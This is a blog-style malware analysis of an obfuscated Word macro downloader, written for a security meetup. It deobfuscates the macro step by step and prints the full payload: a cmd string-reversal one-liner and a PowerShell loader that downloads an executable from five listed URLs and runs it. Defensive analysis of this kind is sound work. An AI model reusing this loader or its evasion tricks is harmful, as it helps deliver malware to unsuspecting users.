---
layout: post
title: Analysis of simple obfuscated office malware
tags: [windows, malware analysis]
category: [en]
---

I decided to prepare a report for [cybersec meetup "KHS community"](https://t.me/khscommunity) in the city of Kostanay (31.05.2019). To do this, I visited [Virusshare](https://virusshare.com/) and download random malicious office sample with the following characteristics:

`VirusTotal Report submitted 2019-02-15 04:37:54 UTC`

`MD5:f7b167150756857c21672842104410e1`

`SHA1:34c457b2db42f0b7039763e92b2b9ae70e2d8e9c`

`SHA256:dd592228c3d1648233f9e29cbdc8c687a980fc9e873196f4d92ff693ad9f9753`

`File Type:XML 1.0 document, ASCII text, with very long lines, with CRLF line terminators`

`Detections: Kaspersky = HEUR:Trojan-Downloader.MSOffice.SLoad.gen`

Analysis was done on _Windows 7 SP 1 Ultimate_, _Microsoft Office 2007_. If we open downloaded sample we will see the following window:

![](/assets/images/ru/OfficeMalware/1_doc_macro.png)

This office document contains a macro and Microsoft Word warns us about it. The body of the document looks like this:

![](/assets/images/ru/OfficeMalware/2_doc_deception_message.png)

Malefactors ask us to enable macros and allow editing of the document. When you download any Microsoft office file from the Internet, it comes with a special mark "Downloaded from the Internet" and is uneditable until you specify the opposite. The message is similar among all such malicious documents, the main goal is to force users to turn on macros and enable edititing mode.

To study document's macro we can extract it with [olevba](https://github.com/decalage2/oletools/wiki/olevba) from [ole-tools](https://www.decalage.info/python/oletools), namely. Short description of olevba:

_olevba is a script to parse OLE and OpenXML files such as MS Office documents (e.g. Word, Excel), to detect VBA Macros, extract their source code in clear text, and detect security-related patterns such as auto-executable macros, suspicious VBA keywords used by malware, anti-sandboxing and anti-virtualization techniques, and potential IOCs (IP addresses, URLs, executable filenames, etc). It also detects and decodes several common obfuscation methods including Hex encoding, StrReverse, Base64, Dridex, VBA expressions, and extracts IOCs from decoded strings._

_olevba_ identified following suspicious VBA keywords:

<pre>
+------------+----------------------+-----------------------------------------+
| Type       | Keyword              | Description                             |
+------------+----------------------+-----------------------------------------+
| AutoExec   | autoopen             | Runs when the Word document is opened   |
| Suspicious | Chr                  | May attempt to obfuscate specific       |
|            |                      | strings (use option --deobf to          |
|            |                      | deobfuscate)                            |
| Suspicious | Shell                | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | vbHide               | May run an executable file or a system  |
|            |                      | command                                 |
| Suspicious | windows              | May enumerate application windows (if   |
|            |                      | combined with Shell.Application object) |
|            |                      | (obfuscation: VBA expression)           |
| Suspicious | Hex Strings          | Hex-encoded strings were detected, may  |
|            |                      | be used to obfuscate strings (option    |
|            |                      | --decode to see all)                    |
| Suspicious | Base64 Strings       | Base64-encoded strings were detected,   |
|            |                      | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| Suspicious | VBA obfuscated       | VBA string expressions were detected,   |
|            | Strings              | may be used to obfuscate strings        |
|            |                      | (option --decode to see all)            |
| IOC        | cmd.exe              | Executable file name (obfuscation: VBA  |
|            |                      | expression)                             |
</pre>

... and suspicious strings:

<pre>
| VBA string | jCgKnc/moc.ssenisubr | "jCgKn" + "c/mo" + "c.sse" + "nisub" +  |
|            | usoh.                | "rusoh."                                |
| VBA string | www//:ptth@Mw6O63Df_ | "www//:" + "ptth@" + "Mw6O6" + "3Df_" + |
|            | Cm066CcdkU7o/moc     | "Cm066C" + "cdkU" + "7o/moc"            |
| VBA string | .aicizyhp.www//:ptth | ".ai" + "cizy" + "hp.ww" + "w//:pt" +   |
|            | @j7OEo_7             | "th@j" + "7OEo_7"                       |
| VBA string | MhAbZp6jnHp/zt.oc.sk | "MhAbZ" + "p6jnH" + "p/z" + "t.oc.s" +  |
|            | eeg                  | "keeg"                                  |
| VBA string | t.liam//:ptth@8or1uz | "t.liam" + "//:" + "ptt" + "h@8or1" +   |
|            | sdZ8vie/RXI/sedulcni | "uzsd" + "Z8vi" + "e/RXI/" + "sed" +    |
|            | -                    | "ulcni-"                                |
</pre>

Obviously, obfuscation is applied. By the line `www //: ptth @ Mw6O63Df_` you can guess that some strings are inverted.

olevba contains an option:

`--deobf Attempt to deobfuscate VBA expressions (slow)`

Export macros with the command:

`olevba.exe --deobf malware_sample > result.txt`

As a result, we obtain the source code of the main macro

![](/assets/images/ru/OfficeMalware/3-source%20code.png)

Static analysis of such obfuscated code is useless, so we need to debug it. Open the _Developer_ tab in the Word and press the _Visual Basic_ button:

![](/assets/images/ru/OfficeMalware/4_word_macros_developer.png)

Paste the source code exported in the previous step:

![](/assets/images/ru/OfficeMalware/5_source.png)

Entry point of the macro is circled in red. Inside, we see a function call with an unknown string. To find out what this string is, we can change the code a bit to reveal the argument and _Add Watch_ to it, or discovere input argument inside _ziilnp_ function during the debug.

![](/assets/images/ru/OfficeMalware/6_export_arg_str.png)

As a result, this string is equal to:

`c: \ onjzioi \ izwolr \ poicwo \ .. \ .. \ .. \ windows \ system32 \ cmd.exe / c% ProgramData: ~ 0.1 %% ProgramData: ~ 9.2% / V: ON / C "set SiQ =; 'cjqhpb' = qijmnd $}} {hctac}}; kaerb; 'bchkzfb' = dqkzr $; hkjzjlz $ metI-ekovnI {) 00004 eg-htgnel.) hkjzjlz $ metI-teG ((fI; jrkjik "= ciikdj $;) ziwmvv '= pzrifoh $;' 904 '= zbwnifi $;' scjmbw '= fczcvii $;) ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam. teN tcejbo-wen = irhwidj $; 'imsizuu' = iijirwb $ ll% 1,3- ~: PMET% h% 1,4- ~: EMANNOISSES% r% 1.5 ~: CILBUP% wop && for / L% h in ( 657, -1,0) do set nu =! Nu !! SiQ: ~% h, 1! && if% h equ 0 echo! Nu: ~ -658! | Cmd "`

The string is passed to the `ziilnp ()` function, which has the following syntax:
<pre>
Function ziilnp(zdwrhc)
On Error Resume Next
   Select Case bofcsp
      Case 600812771
         zssvqbs = CStr(rfolwz)
         infpjz = CStr(fiuwjmh)
      Case 691931294
         qhplj = cufwqqj
         lcbfq = Hex(751111903)
      Case 693375610
         swkjiw = wiiwsh
         jiuaoso = Log(311238894)
End Select
   Select Case qvkomu
      Case 676369523
         wvhzs = CStr(sffmkpj)
         zwfzq = CStr(maljh)
      Case 613766996
         tljjc = jjqcvpt
         opopw = Hex(446181185)
      Case 540556815
         qvwhtl = dtwfas
         nzjoo = Log(576824669)
End Select
ziilnp = ziilnp(Interaction.Shell(zdwrhc, vbHide))
   Select Case rmwhcfv
      Case 974865143
         wazknzq = CStr(jvdnm)
         jzvuil = CStr(ltmph)
      Case 351660802
         mffqwz = djhiwo
         onwvdm = Hex(505454459)
      Case 428217029
         wtkadzs = ihdpjs
         bizczv = Log(97188184)
End Select
</pre>

We see a bunch of useless select statements. It is the consequences of obfuscation so we can ignore it. What interests us most is the line:

`ziilnp = ziilnp(Interaction.Shell(zdwrhc, vbHide))`

_Interaction.Shell_ - executes the passed command (our string). Let's take a closer look at our payload:

`c:\onjzioi\izwolr\poicwo\..\..\..\windows\system32\cmd.exe` - it avoids direct path detection to cmd.exe using Directory traversal attack.

`/c %ProgramData:~0.1%%ProgramData:~9.2%` this is passed to cmd.exe. 

`%ProgramData%` expands to `C:\ProgramData`.

`~ 0,1` - means output 1 character starting from the 0th element,  result is - `"C"`. 
`~ 9.2` - take two characters from the 9th element - `"mD"`. As a result, we got the string `"CmD"`:

![](/assets/images/ru/OfficeMalware/echo%20obfuscated%20program%20data.png)

This is one of the obfuscation methods for calling cmd.exe, along with %COMSPEC%. The rest of the line is:

`/V:ON/C"set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop&&for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd"` 

According to help of cmd.exe, `/V:ON` allows a variable to get a new value in each iteration of the FOR loop. 
<pre>
/V:ON Enable delayed environment variable expansion 
         this allows a FOR loop to specify !variable! instead of %variable% 
         expanding the variable at execution time instead of at input time.
</pre>

Next comes the command for execution. Let's divide it into two parts. First part:

`set SiQ=;'cjqhpb'=qijmnd$}}{hctac}};kaerb;'bchkzfb'=dqkzr$;hkjzjlz$ metI-ekovnI{ )00004 eg- htgnel.)hkjzjlz$ metI-teG(( fI;'jrkjik'=ciikdj$;)hkjzjlz$ ,qjcaki$(eliFdaolnwoD.irhwidj${yrt{)ujbwa$ ni qjcaki$(hcaerof;'exe.'+zbwnifi$+'\'+pmet:vne$=hkjzjlz$;'ziwmvv'=pzrifoh$;'904' = zbwnifi$;'scjmbw'=fmsqvii$;)'@'(tilpS.'41fpegeLDajCgKnc/moc.ssenisubrusoh.www//:ptth@Mw6O63Df_Cm066CcdkU7o/moc.aicizyhp.www//:ptth@j7OEo_7MhAbZp6jnHp/zt.oc.skeegt.liam//:ptth@8or1uzsdZ8vie/RXI/sedulcni-pw/moc.srevirehtybkramdnal//:ptth@R8Fd3N9UmbYBzI/ten.enoniletoh.www//:ptth'=ujbwa$;tneilCbeW.teN tcejbo-wen=irhwidj$;'imsizuu'=iijirwb$ ll%1,3-~:PMET%h%1,4-~:EMANNOISSES%r%1,5~:CILBUP%wop`

Second part: `for /L %h in (657,-1,0)do set nu=!nu!!SiQ:~%h,1!&&if %h equ 0 echo !nu:~-658!| cmd`

In the first part, the variable `SiQ` is set to some sort of character set. As we noted earlier, it is very similar to an inverted string. Revert it to normal state:

`pow%PUBLIC:~5,1%r%SESSIONNAME:~-4,1%h%TEMP:~-3,1%ll $bwrijii='uuzismi';$jdiwhri=new-object Net.WebClient;$awbju='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');$iivqsmf='wbmjcs';$ifinwbz = '409';$hofirzp='vvmwiz';$zljzjkh=$env:temp+'\'+$ifinwbz+'.exe';foreach($ikacjq in $awbju){try{$jdiwhri.DownloadFile($ikacjq, $zljzjkh);$jdkiic='kijkrj';If ((Get-Item $zljzjkh).length -ge 40000) {Invoke-Item $zljzjkh;$rzkqd='bfzkhcb';break;}}catch{}}$dnmjiq='bphqjc';`

To understand how these two parts work, I will give a small example. Suppose we want to obfuscate the `help` call in `cmd`.
To do this, set the environment variable `siq = pleh` (help vice versa).
`for / L% h in (3, -1,0) do` - loop with 4 iterations, for each letter
`set nu =! nu !! siq: ~% h, 1!` - every iteration, we add to the variable `nu` the value` siq: ~% h, 1`, since `% h` is the index of the string from the end, then we each iteration make up a string equal to the inverse.
`if% h equ 0 echo! nu: ~ -4! | cmd` - wait until each character is processed and send the result to be executed to cmd.exe. As a result, we get the following command:
`set siq = pleh && for / L% h in (3, -1,0) do set nu =! nu !! siq: ~% h, 1! && if% h equ 0 echo! nu: ~ -4! | cmd`

![](/assets/images/ru/OfficeMalware/cmd_help_obfuscation.png)

Thereby, the seemingly tangled string turned into an understandable thing. Similarly, it happens with our malicious payload. 

Now back to our main playload. First we see the line:
* `pow% PUBLIC: ~ 5.1% r% SESSIONNAME: ~ -4.1% h% TEMP: ~ -3.1% ll` - as we can already assume, this is also an obfuscated line.
* `% PUBLIC: ~ 5.1%` - is taking a substring of 1 character, starting from the 5th in the `C:\Users\Public` line. Result letter `"e"`
* Next is just the letter `"r"`
* `% SESSIONNAME: ~ -4.1%` - this is taking a substring of 1 character, starting from the 4th, from the end in the line `Console`. Result is letter `"s"`
* Next is just the letter `"h"`
* `% TEMP: ~ -3.1%` - this is taking a substring of 1 character, starting from the 3rd, from the end, in the line `C:\Users\RDRG\AppData\Local\Temp`. Result is letter `"e"`
* Further, just the letters `"ll"`
Total: `powershell`

After that comes the powershell code:
<pre>
$bwrijii='uuzismi';

$jdiwhri=new-object Net.WebClient;

$awbju='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');

$iivqsmf='wbmjcs';
$ifinwbz = '409';
$hofirzp='vvmwiz';
$zljzjkh=$env:temp+'\'+$ifinwbz+'.exe';
foreach($ikacjq in $awbju){
	try{
		$jdiwhri.DownloadFile($ikacjq, $zljzjkh);
		$jdkiic='kijkrj';
		If ((Get-Item $zljzjkh).length -ge 40000) {
			Invoke-Item $zljzjkh;
			$rzkqd='bfzkhcb';
			break;
		}
	} catch {
	}
}
$dnmjiq='bphqjc';
</pre>

Let's turn it into more understandable code by removing all unnecessary and renaming variables:

<pre>
$webClient=new-object Net.WebClient;

$URLS='http://www.hotelinone.net/IzBYbmU9N3dF8R@http://landmarkbytherivers.com/wp-includes/IXR/eiv8Zdszu1ro8@http://mail.tgeeks.co.tz/pHnj6pZbAhM7_oEO7j@http://www.phyzicia.com/o7UkdcC660mC_fD36O6wM@http://www.hosurbusiness.com/cnKgCjaDLegepf14'.Split('@');

$filenameInTempFolder=$env:temp+'\409.exe';
foreach($url in $URLS){
	try{
		$webClient.DownloadFile($url, $filenameInTempFolder);
		If ((Get-Item $filenameInTempFolder).length -ge 40000) {
			Invoke-Item $filenameInTempFolder;
			break;
		}
	} catch {
	}
}
</pre>

Obviously, script downloads each file, one by one, according to the url, into the file with name `409.exe`, into a temporary folder and run it. Unfortunately, these files no longer exist and no further analysis is possible.